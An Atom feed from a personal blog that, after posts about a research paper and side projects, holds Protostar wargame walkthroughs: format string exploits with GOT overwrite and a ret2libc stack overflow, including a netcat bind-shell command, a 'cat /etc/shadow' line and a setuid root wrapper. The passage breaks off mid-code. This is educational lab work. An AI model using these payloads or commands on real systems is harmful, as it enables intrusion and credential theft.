<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: projects | Louis Li]]></title>
  <link href="http://louisrli.github.io/blog/categories/projects/atom.xml" rel="self"/>
  <link href="http://louisrli.github.io/"/>
  <updated>2015-02-05T20:05:33-05:00</updated>
  <id>http://louisrli.github.io/</id>
  <author>
    <name><![CDATA[Louis Li]]></name>
    <email><![CDATA[louisrli@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Erasable Code Contracts]]></title>
    <link href="http://louisrli.github.io/blog/2014/01/09/erasable-contracts/"/>
    <updated>2014-01-09 00:00:00 -0500</updated>
    <id>http://louisrli.github.io/blog/2014/01/09/erasable-contracts</id>
    <content type="html"><![CDATA[<p>This semester, I took a course on the science of cybersecurity, targeted toward an audience with some programming languages background. </p>

<p>A classmate and I had a semester long research project on “erasable” <a href="http://en.wikipedia.org/wiki/Code_contract">code contracts</a>. More details are below.</p>

<p>This was a valuable experience, giving me an opportunity to work on two things that I hadn’t done before:</p>

<ol>
  <li>Proof-based research</li>
  <li>Basic proofs of a calculus. While type soundness proofs and their associated lemmas are core to many calculi, many introductory programming language courses, including the one that I took, skip the details of the proofs.</li>
</ol>

<!-- more -->

<p>Here’s the abstract:</p>

<blockquote>
  <p>Contract programming is a design approach that allows programmers to design formal specifications for software, known as “contracts”. These contracts, executed at runtime, allow programmers to make assertions about the behavior of their software and ensure program correctness. In a language with side-effects, however, it is possible for these contracts to modify memory and consequently change the behavior of the program. While contracts provide the specifications, these specifications clearly should not change the behavior of the program that they enforce. Instead, if the contracts were removed (“erased”), then the behavior of the program should be the same as if the contracts remained. This notion is captured by the idea of erasability. We present a calculus for erasable contracts, establish properties such as type soundness, and prove a formal definition of erasability for the language.</p>
</blockquote>

<p><a href="/downloads/erasable-final.pdf">Download the PDF</a> or view it below. Note that it’s missing some of the grittier nuances of the eta-reductions.</p>

<embed src="/downloads/erasable-final.pdf" type="application/pdf" width="100%" height="600" />

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hungrier: Harvard Dining Menu, Re-released]]></title>
    <link href="http://louisrli.github.io/blog/2013/08/22/hungry-revamped/"/>
    <updated>2013-08-22 00:00:00 -0400</updated>
    <id>http://louisrli.github.io/blog/2013/08/22/hungry-revamped</id>
    <content type="html"><![CDATA[<p>I’ve rewritten and redesigned <a href="http://louisrli.github.io/hungry/">Hungry</a>, a site that filters the noisy Harvard dining menu for relevant entries. If you’re reading this during the school year, there probably won’t be anything, since student dining isn’t open.</p>

<p>This version was written in <a href="http://marionettejs.com">Marionette.js</a>, which has been my client-side framework of choice for the past few months (I’ve been using Meteor for things that require a more involved database). It still retains an obnoxious minimalism, but this time with lowercase text instead of uppercase text.</p>

<p><a href="https://github.com/louisrli/hungry">Source code here</a>, contributions welcome.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2012 in Sideprojects]]></title>
    <link href="http://louisrli.github.io/blog/2013/01/12/sideprojects-2012/"/>
    <updated>2013-01-12 00:00:00 -0500</updated>
    <id>http://louisrli.github.io/blog/2013/01/12/sideprojects-2012</id>
    <content type="html"><![CDATA[<p>It always surprises me how long a year is. It’s hard for me to believe that some of these projects were a year ago, but I’m happy to see my progress. Here’s a walk down memory lane for my projects in 2012, not including course projects and research.</p>

<p><a id="exploits" style="visibility:hidden;"> </a></p>

<h3 id="exploit-exercises-protostar-nebula">Exploit Exercises: Protostar, Nebula</h3>

<dl>
  <dt>Description</dt>
  <dd>A series of security wargames from <a href="http://exploit-exercises.com">Exploit Exercises</a>.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>shell, C, assembly and shellcode, command line tools, compilation and libraries</dd>
  <dt>Other</dt>
  <dd>These were both fun and educational. These problems required a good deal of persistence. Topics ranged from: buffer overflows, shell code, stack layout, library linking, race conditions, format strings, command line tools, networking. I’ve posted the solutions on this site for the format string, stack, and shell exploit sections.</dd>
  <dt>Links</dt>
  <dd><a href="http://louisrli.github.com/sideprojects/2012/06/22/nebula0">Nebula shell solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/18/protostar-stack0">Protostar stack solutions: part 1</a>, <a href="http://louisrli.github.com/sideprojects/2012/08/29/protostar-format0">Protostar format solutions</a></dd>
</dl>

<!-- more -->
<p><a id="euler" style="visibility:hidden;"> </a></p>

<h3 id="project-euler">Project Euler</h3>
<dl>
  <dt>Description</dt>
  <dd>A series of mathematical programming problems from <a href="http://projecteuler.net/">Project Euler</a>.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>C++, Scala</dd>
  <dt>Other</dt>
  <dd>Over the winter break of my freshman year (January 2012), I worked on these in C++. I’ll admit that I’m a bit embarrassed of the code I wrote – C++ isn’t the greatest language to use to work on these problems. However, Project Euler is a great way to become familiar with a language. The problems become significantly harder, and I continued with Scala (June 2012 - August 2012).</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/project-euler">code solutions</a></dd>
</dl>

<p><a id="grabrc" style="visibility:hidden;"> </a></p>

<h3 id="grabrc">.grabrc</h3>
<dl>
  <dt>Description</dt>
  <dd>A command-line client for downloading dotfiles from Github, giving a comfortable editing environment from any terminal. It can be installed via <a href="http://www.pip-installer.org/en/latest/">pip</a> (<code>pip install grabrc-client</code>).</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Python (client), Scala Play Framework (server)</dd>
  <dt>Other</dt>
  <dd>This was a pretty significant endeavor over the summer. The idea was motivated by my work with Amazon EC2 machines, virtual machines, and random in-house servers. Many times, I had to do work while ssh’d to those machines, but it was less productive without my comfortable shell and emacs environment at hand. sftp’ing files is a bit tedious, so I wrote a client (command-line Python) and a server (RESTful API) for accessing my dotfiles. The server is currently hosted on Heroku. I do, in fact, eat my own dog food, and it’s very handy when setting up new computers.</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/grabrc-server">server source code</a>, <a href="https://github.com/louisrli/grabrc-client">client source code</a>, <a href="http://pypi.python.org/pypi/grabrc-client/">PyPI index</a></dd>
</dl>

<p><a id="shuttleboy" style="visibility:hidden;"> </a></p>

<h3 id="shuttleboy-ios">Shuttleboy iOS</h3>
<dl>
  <dt>Description</dt>
  <dd>A native iOS version of the Harvard shuttle tracker, <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Objective-C, Cocoa Touch</dd>
  <dt>Other</dt>
  <dd>I worked on this for a few weeks during the winter break of my freshman year (January 2012). I didn’t want to pay for Apple Developer membership on my own, but after a long wait, I’m planning to release it through Rover soon.</dd>
  <dt>Links</dt>
  <dd><a href="/images/shuttleboy-preview.png">screenshots</a></dd>
</dl>

<p><a id="shuttlebaby" style="visibility:hidden;"> </a></p>

<h3 id="shuttlebabyhttpwwwhcsharvardedulouisshuttlebaby"><a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">Shuttlebaby</a></h3>
<dl>
  <dt>Description</dt>
  <dd>A website with the next few times between two particular stops on <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>. Can be forked and customized.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>PHP, HTML, CSS</dd>
  <dt>Links</dt>
  <dd><a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">site</a>, <a href="https://github.com/louisrli/shuttlebaby">source code</a></dd>
</dl>

<p><a id="hungry" style="visibility:hidden;"> </a></p>

<h3 id="hungryhttpwwwhcsharvardedulouishungry"><a href="http://www.hcs.harvard.edu/~louis/hungry/">Hungry</a></h3>
<dl>
  <dt>Description</dt>
  <dd>A website with an obnoxiously concise version of the Harvard dining menu, showing only entrees. Includes an option to sign up and receive daily emails.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>PHP, HTML, CSS</dd>
  <dt>Links</dt>
  <dd><a href="http://www.hcs.harvard.edu/~louis/hungry/">site</a>, <a href="https://github.com/louisrli/hungry">source code</a></dd>
</dl>

<h3 id="jenkins-arbitrary-parameters-plugin">Jenkins Arbitrary Parameters Plugin</h3>
<dl>
  <dt>Description</dt>
  <dd>A plugin for the open-source continuous integration tool [Jenkins] that allows an arbitrary number of string parameters to be passed in as key-value pairs in properties file format.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Java, Jenkins</dd>
  <dt>Other</dt>
  <dd>Over the summer, one of my first intern projects was constructing a parameterized test framework in Jenkins that would run jobs along a matrix of parameters: operating system, MySQL version, log4cpp version, Java version, etc. Along with some work on the ec2-plugin, this was my first time looking at such a huge codebase. After poking around the Javadocs and Confluence wiki for a substantial amount of time, I wrote this plugin.</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/arbitrary-parameters-plugin">source code</a></dd>
</dl>

<p><a id="louisrligithub" style="visibility:hidden;"> </a></p>

<h3 id="louisrligithubcomhttplouisrligithubcom"><a href="http://louisrli.github.com">louisrli.github.com</a></h3>
<dl>
  <dt>Description</dt>
  <dd>This site.</dd>
  <dt>Languages &amp; Tools</dt>
  <dd>Customized Twitter Bootstrap (HTML/CSS/Javascript), Jekyll, Markdown</dd>
  <dt>Links</dt>
  <dd><a href="https://github.com/louisrli/louisrli.github.com">source code</a>, <a href="http://louisrli.github.com/">site</a></dd>
</dl>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
    <updated>2012-08-29 00:00:00 -0400</updated>
    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This post contains solutions and walkthroughs for the four format string levels (“Format”).</p>

<h1 id="solutions">Solutions</h1>
<p>## Format: Level 0
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>

<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format0 %64s<span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>ef<span class="se">\x</span>be<span class="se">\x</span>ad<span class="se">\x</span>de”’<span class="k">)</span>&lt;/p&gt;

<span class="go">&lt;p&gt;you have hit the target correctly :)</span></code></pre></div></p>

<!-- more -->
<p>## Format: Level 1
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>

<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format1 <span class="p">|</span> grep target
<span class="go">08049638 g       0 .bss    00000004            target</span></code></pre></div></p>

<p>Next, we need to find where the format function expects the first (missing) argument to the format string.
<div class="highlight"><pre><code class="language-text" data-lang="text">Starting program: /opt/protostar/bin/format1 AAAA%08x&lt;/p&gt;

&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98f “AAAA%08x”) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/10xw $esp
0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
0xbffff788:     0xbffff7b8      0x08048469
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c
(gdb) p 0xbffff98f - 0x0bffff784
$1 = 523</code></pre></div></p>

<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string’s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>

<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.
<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) run AAAAA%08x
The program being debugged has been started already.
Start it from the beginning? (y or n) y&lt;/p&gt;

&lt;p&gt;Starting program: /opt/protostar/bin/format1 AAAAA%08x&lt;/p&gt;

&lt;p&gt;Breakpoint 1, __printf (format=0xbffff98e “AAAAA%08x”) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c</code></pre></div></p>

<ul>
  <li><code>0xbffff784</code>: The first argument to the format string.</li>
  <li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
</ul>

<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for “stack popping” additional arguments) is about 500 bytes.</p>

<p>With a few calculations, we can find the correct offset.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ./format1 <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>38<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’..%128<span class="nv">$n</span>’
<span class="go">8..you have modified the target :)</span></code></pre></div></p>

<h2 id="format-level-2">Format: Level 2</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format2 <span class="p">|</span> grep target
<span class="go">080496e4 g     O .bss   00000004              target</span></code></pre></div></p>

<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>e4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>%4<span class="nv">$08x</span> <span class="p">|</span> ./format2
<span class="go">080496e4target is 0 :(</span></code></pre></div></p>

<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>e4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>%60u%4<span class="nv">$n</span> <span class="p">|</span> ./format2
<span class="go">                                                         512you have modified the target :)</span></code></pre></div></p>

<h2 id="format-level-3">Format: Level 3</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -t format3 <span class="p">|</span> grep target
<span class="go">080496f4 g     O .bss   00000004              target</span></code></pre></div></p>

<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.
<div class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break printf
Breakpoint 1 at 0x804837c
(gdb) run
Starting program: /opt/protostar/bin/format3
AAAA
Breakpoint 1, __printf (format=0xbffff5a0 “AAAA\n”) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) info frame
Stack level 0, frame at 0xbffff570:
eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
called by frame at 0xbffff590
source language c.
Arglist at 0xbffff568, args: format=0xbffff5a0 “AAAA\n”
Locals at 0xbffff568, Previous frame’s sp is 0xbffff570
Saved registers:
ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
(gdb) x/3xw 0xbffff568
0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
(gdb) x/w 0xbffff570
0xbffff570:     0xbffff5a0
(gdb) p 0xbffff5a0 - 0xbffff570
= 48</code></pre></div></p>

<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo </span>AAAA%12<span class="nv">$x</span> <span class="p">|</span> ./format3
<span class="go">AAAA41414141</span>
<span class="go">target is 00000000 :(</span></code></pre></div></p>

<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 44” <span class="p">|</span> bc
<span class="go">68</span>
<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 55” <span class="p">|</span> bc
<span class="go">85</span>
<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 02” <span class="p">|</span> bc
<span class="go">2</span>
<span class="gp">$</span> <span class="nb">echo</span> “ibase<span class="o">=</span>16<span class="p">;</span> 01” <span class="p">|</span> bc
<span class="go">1</span></code></pre></div></p>

<p>Finally, we write values to each of the four bytes of <code>target</code>:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>f4<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f5<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f6<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)$(</span>perl -e ‘print “<span class="se">\x</span>f7<span class="se">\x</span>96<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%52u%12<span class="nv">$n</span>%’‘17u%13<span class="nv">$n</span>’‘%173u%14<span class="nv">$n</span>’ <span class="p">|</span> ./format3
<span class="go">���                                                   0       3221222848                                                                                                                                                                   3086839796</span>
<span class="go">you have modified the target :))</span></code></pre></div></p>

<p>Note that it wasn’t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>

<h2 id="format-level-4">Format: Level 4</h2>
<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>

<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> ‘AAAA%4<span class="nv">$x</span>’ <span class="p">|</span> ./format4
<span class="go">AAAA41414141</span></code></pre></div></p>

<p>In order to perform this exploit, we’ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we’ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -TR format4 <span class="p">|</span> grep <span class="nb">exit</span>
<span class="go">00000000      DF &lt;em&gt;UND&lt;/em&gt; 00000000  GLIBC_2.0   _exit</span>
<span class="go">00000000      DF &lt;em&gt;UND&lt;/em&gt;  00000000  GLIBC_2.0   exit</span>
<span class="go">08049718 R_386_JUMP_SLOT   _exit</span>
<span class="go">08049724 R_386_JUMP_SLOT   exit</span>
<span class="gp">$</span> objdump -t format4 <span class="p">|</span> grep hello
<span class="go">080484b4 g     F .text  0000001e              hello</span></code></pre></div></p>

<p>To confirm that our overwrite works correctly, we run a quick test:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>24<span class="se">\x</span>97<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%4<span class="nv">$n</span>’ <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/format4
<span class="gp">$</span> gdb -q format4
<span class="go">Reading symbols from /opt/protostar/bin/format4…done.</span>
<span class="go">(gdb) run &amp;lt; /tmp/format4</span>
<span class="go">Starting program: /opt/protostar/bin/format4 &amp;lt; /tmp/format4</span>
<span class="gp">$</span>�
<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="go">0x00000004 in ?? ()</span></code></pre></div></p>

<p>Execution jumped to the address <code>0x00000004</code>, meaning that we’re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> – only the last two bytes need to be changed.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> <span class="k">$(</span>perl -e ‘print “<span class="se">\x</span>24<span class="se">\x</span>97<span class="se">\x</span>04<span class="se">\x</span>08”’<span class="k">)</span>’%33968u%4<span class="nv">$hn</span>’ <span class="p">|</span> ./format4
<span class="gp">$</span>
<span class="go">&lt;lots of=&quot;&quot; whitespace=&quot;&quot;&gt;</span>
<span class="go">512</span>
<span class="go">                                                                                                                                                                              code execution redirected! you win</span></code></pre></div></lots></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
    <updated>2012-08-28 00:00:00 -0400</updated>
    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
    <content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>

<h1 id="solutions">Solutions</h1>
<p>## Stack 6
<strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>

<h3 id="utilities">Utilities</h3>
<p>We’ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>

<p><code>~/try-address.sh</code>:
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
<span class="c"># Takes an offset and unlimited 4-byte addresses and prints it in little-endian order</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span>-lt <span class="m">2</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> “usage: <span class="nv">$0</span> OFFSET ADDRESS. Example: <span class="nv">$0</span> <span class="m">80</span> 0xdeadbeef 0xf00f00f0”
    <span class="nb">exit </span>1
<span class="k">fi</span>&lt;/p&gt;

&lt;p&gt;perl -e “print ‘A’x<span class="nv">$1</span>”
<span class="nb">shift</span>
<span class="k">for</span> addr in <span class="nv">$@</span><span class="p">;</span> <span class="k">do</span>
    <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">8</span> -2 2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -ne “<span class="se">\x</span><span class="k">${</span><span class="nv">addr</span><span class="p">:</span><span class="nv">$i</span><span class="p">:</span><span class="nv">2</span><span class="k">}</span>”<span class="p">;</span> <span class="k">done</span>
<span class="k">done</span></code></pre></div></p>

<!-- more -->
<p>### Solution
First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="k">for</span> i in <span class="k">$(</span>seq <span class="m">76</span> <span class="m">4</span> 100<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> ~/try-address.sh <span class="nv">$i</span> 0xbfffffff <span class="p">|</span> ./stack6<span class="p">;</span> <span class="k">done</span>
<span class="go">76</span>
<span class="go">…</span>
<span class="go">80</span>
<span class="go">input path please: bzzzt (0xbfffffff)</span>
<span class="go">84</span>
<span class="go">…</span></code></pre></div></p>

<p>For our solution, we’ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it’s one of the most well-written papers that I’ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>

<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn’t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gdb -q stack6
<span class="go">Reading symbols from /opt/protostar/bin/stack6…done.</span>
<span class="go">(gdb) break main</span>
<span class="go">Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.</span>
<span class="go">(gdb) run</span>
<span class="go">Starting program: /opt/protostar/bin/stack6&lt;/p&gt;</span>

<span class="go">&lt;p&gt;Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27</span>
<span class="go">27      stack6/stack6.c: No such file or directory.</span>
<span class="go">in stack6/stack6.c</span>
<span class="go">(gdb) print system</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span><span class="p">&amp;</span>lt<span class="p">;</span>text variable, no debug info<span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span> 0xb7ecefb0 &lt;__libc_system&gt;
<span class="go">(gdb) print exit</span>
<span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="o">{</span><span class="p">&amp;</span>lt<span class="p">;</span>text variable, no debug info<span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span> 0xb7ec50c0 <span class="p">&amp;</span>lt<span class="p">;</span>*__GI_exit<span class="p">&amp;</span>gt<span class="p">;</span></code></pre></div></__libc_system></p>

<p>We see that our functions have the following addresses:</p>

<ul>
  <li><code>system()</code>: <code>0xb7ecefb0</code></li>
  <li><code>exit()</code>: <code>0xb7ec50c0</code></li>
</ul>

<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> ~/try-address.sh <span class="m">80</span> <span class="o">(</span>ENV_VAR_ADDRESS<span class="o">)</span> <span class="o">(</span>EXIT<span class="o">()</span>_ADDRESS<span class="o">)</span> <span class="o">(</span>SYSTEM<span class="o">()</span>_ADDRESS<span class="o">)</span></code></pre></div></p>

<h4 id="sanity-checks">Sanity checks</h4>
<p>First, let’s make sure that we can actually execute code.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">TEST</span><span class="o">=</span>whoami
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8a <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���</span>
<span class="go">sh: =whoami: not found</span>
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff8b <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���</span>
<span class="go">root</span></code></pre></div></p>

<h4 id="working-netcat-solution">Working netcat solution</h4>
<p>There are two obstacles to a working solution.</p>

<ol>
  <li>Environmental variables with spaces don’t work. All of the following would fail:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”nc -lp8080 -e/bin/sh”
<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”cat /etc/shadow”
<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>”<span class="s2">&quot;cat /etc/shadow&quot;</span>”</code></pre></div></li>
  <li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
</ol>

<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;&lt;/stdlib.h&gt;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// These two are necessary, as system() drops privileges</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
